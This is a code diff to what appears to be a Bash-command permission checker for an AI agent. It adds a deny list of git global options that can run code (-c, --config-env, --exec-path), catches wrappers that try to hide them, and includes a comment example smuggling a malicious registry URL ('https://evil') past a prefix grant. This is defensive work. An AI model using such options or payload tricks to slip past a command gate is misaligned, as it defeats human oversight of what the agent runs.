@@ -159,6 +159,54 @@ function resolveAll(args: BashCheckArgs, candidate: string, cwd: readonly string
   return resolved.every((path): path is string => path !== null) ? resolved : undefined;
 }
 
+// Same grammar as GIT_OPTIONS in bash-canonical.ts: what may sit between `git` and its subcommand.
+const GIT_FLAG_OPTIONS = new Set([
+  "--no-pager",
+  "-p",
+  "--paginate",
+  "--bare",
+  "--literal-pathspecs",
+  "--no-replace-objects",
+]);
+const GIT_VALUE_OPTIONS = new Set(["-C", "--git-dir", "--work-tree", "--namespace"]);
+const GIT_VALUE_PREFIXES = ["--git-dir=", "--work-tree=", "--namespace="];
+const GIT_ESCAPE_OPTIONS = ["-c", "--config-env", "--exec-path"];
+
+function escapeOptionName(word: string): string | undefined {
+  return GIT_ESCAPE_OPTIONS.find((option) => word === option || word.startsWith(`${option}=`));
+}
+
+/**
+ * The git global option (`-c`, `--config-env`, `--exec-path`) that runs before a git
+ * subcommand, found at ANY token position so a wrapper in front cannot hide it. A
+ * non-command `git` word is refused too (fails closed).
+ */
+function gitConfigOption(words: readonly string[]): string | undefined {
+  for (let i = 0; i < words.length; i += 1) {
+    const word = words[i] as string;
+    if (word !== "git" && !word.endsWith("/git")) continue;
+    for (let j = i + 1; j < words.length; ) {
+      const next = words[j] as string;
+      const escapeOption = escapeOptionName(next);
+      if (escapeOption !== undefined) return escapeOption;
+      if (GIT_FLAG_OPTIONS.has(next) || GIT_VALUE_PREFIXES.some((prefix) => next.startsWith(prefix))) j += 1;
+      else if (GIT_VALUE_OPTIONS.has(next)) j += 2;
+      else break;
+    }
+  }
+  return undefined;
+}
+
+function refuseWords(words: readonly string[]): BashCheck | undefined {
+  // Same list and normalizer as Exec: a prefix grant gates the verb, never the
+  // payload, so `bun add x --registry https://evil` satisfies `bun add *`.
+  const flag = deniedFlag(words);
+  if (flag !== undefined) return deny(`flag ${flag} is not permitted in a Bash command`);
+  const gitOption = gitConfigOption(words);
+  if (gitOption !== undefined) return deny(`git global option ${gitOption} is not permitted in a Bash command`);
+  return undefined;
+}
+
 function checkPayload(
   args: BashCheckArgs,
   segment: BashSegment,
@@ -166,10 +214,8 @@ function checkPayload(
 ): { readonly refusal?: BashCheck; readonly cdTargets?: readonly string[] } {
   const words = segment.tokens.map((token) => token.text);
 
-  // Same list and normalizer as Exec: a prefix grant gates the verb, never the
-  // payload, so `bun add x --registry https://evil` satisfies `bun add *`.
-  const flag = deniedFlag(words);
-  if (flag !== undefined) return { refusal: deny(`flag ${flag} is not permitted in a Bash command`) };
+  const wordRefusal = refuseWords(words);
+  if (wordRefusal !== undefined) return { refusal: wordRefusal };
 
   for (const token of segment.tokens) {
     // The exact covering pathspec (a quoted glob) is git pathspec magic, not shell expansion (#2493).
@@ -297,15 +343,32 @@ function matchingDenial(args: BashCheckArgs, segments: readonly BashSegment[]): 
   return undefined;
 }
 
-function ruleSegments(segments: readonly BashSegment[], refuseUnreadable: boolean): CanonicalResult {
+/**
+ * A view per token suffix starting at index 1, so a deny or ask rule sees the
+ * command behind any wrapper `canonicalSegments` does not model (`setsid`,
+ * `ionice`, `arch`, ...). Rule views only: a view can never grant anything.
+ */
+function suffixViews(segment: BashSegment): readonly BashSegment[] {
+  return segment.tokens.slice(1).map((_, offset) => ({ ...segment, tokens: segment.tokens.slice(offset + 1) }));
+}
+
+function ruleSegments(
+  segments: readonly BashSegment[],
+  refuseUnreadable: boolean,
+  withSuffixes: boolean,
+): CanonicalResult {
   const views: BashSegment[] = [];
-  for (const segment of segments) {
+  const add = (segment: BashSegment): void => {
     views.push(segment);
+    if (withSuffixes) views.push(...suffixViews(segment));
+  };
+  for (const segment of segments) {
+    add(segment);
     const canonical = canonicalSegments(segment);
     if (canonical.kind === "refused") {
       if (refuseUnreadable) return canonical;
     } else {
-      views.push(...canonical.segments);
+      for (const view of canonical.segments) add(view);
     }
   }
   return { kind: "ok", segments: views };
@@ -327,7 +390,11 @@ export function checkBashCommand(args: BashCheckArgs): BashCheck {
 
   // Only deny/ask see these additional views. Payloads, cwd and grants below
   // continue to evaluate the original tokens (canonicalization cannot grant).
-  const views = ruleSegments(segments, args.denyEntry !== undefined);
+  const views = ruleSegments(
+    segments,
+    args.denyEntry !== undefined,
+    args.denyEntry !== undefined || args.askEntry !== undefined,
+  );
   if (views.kind === "refused") return deny(views.reason);
   const matchingSegments = views.segments;
   const denied = matchingDenial(args, matchingSegments);
